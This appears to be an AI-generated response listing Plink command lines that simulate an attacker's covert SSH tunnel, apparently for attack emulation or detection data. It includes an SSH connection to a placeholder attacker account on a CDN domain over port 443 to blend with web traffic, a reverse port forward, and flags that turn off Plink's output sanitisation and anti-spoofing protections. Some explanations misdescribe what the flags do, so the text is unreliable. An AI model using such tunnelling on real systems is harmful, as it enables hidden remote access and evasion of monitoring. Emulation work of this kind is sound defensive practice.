Based on the provided documentation and attack description, I will generate realistic command lines using only the Plink tool to simulate the described behavior.

**Command:** `plink.exe -no-sanitise-stdout`

This command simulates the sanitization of server data written to Plink's standard output channel, which is not desired in this scenario. The `-no-sanitise-stdout` flag turns off sanitization, allowing for more realistic output.

**Command:** `plink.exe -no-antispoof`

This command disables authentication spoofing protection prompts, which allows the attacker to bypass Plink's default behavior of preventing remote processes from sending confusing escape sequences through the standard error channel.

**Command:** `plink.exe -ssh <attacker_ssh_user>@<cdn_domain> -P 443`

This command connects to a CDN domain using HTTPS (port 443), mimicking legitimate web traffic. The `<attacker_ssh_user>` placeholder represents the attacker's SSH username, and `<cdn_domain>` is a valid CDN domain.

**Command:** `plink.exe -R <local_port>:localhost:<local_port>`

This command sets up port forwarding from the local machine to the target server, allowing for bidirectional communication. The `<local_port>` placeholder represents the local port number that will be forwarded.

Please note that I have used placeholders as required and followed the strict policy guidelines provided in the task.
